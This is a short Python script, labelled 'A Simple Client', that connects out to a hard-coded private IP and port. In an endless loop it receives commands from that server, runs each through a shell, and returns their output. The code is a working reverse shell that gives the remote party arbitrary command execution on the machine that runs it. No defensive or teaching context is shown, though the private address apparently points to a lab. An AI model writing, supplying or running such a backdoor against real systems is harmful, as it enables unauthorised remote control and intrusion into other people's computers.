# =================  A Simple Client ======================

import socket
import subprocess  # For running processes
import time


def connect():
  s = socket.socket()

  for _ in range(4):
    print('[*] Establishing connection')

  s.connect(('192.168.147.129', 9999))
  print('[+] Connection established')
  
  # Infinite loop
  while True:
    # Receiving the command from server
    command = s.recv(1024)

    if 'quit' in command.decode('utf-8'):
      s.close()
      break
    else:
      CMD = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      s.send(CMD.stdout.read())
      s.send(CMD.stderr.read())

def main():
  connect()

main()
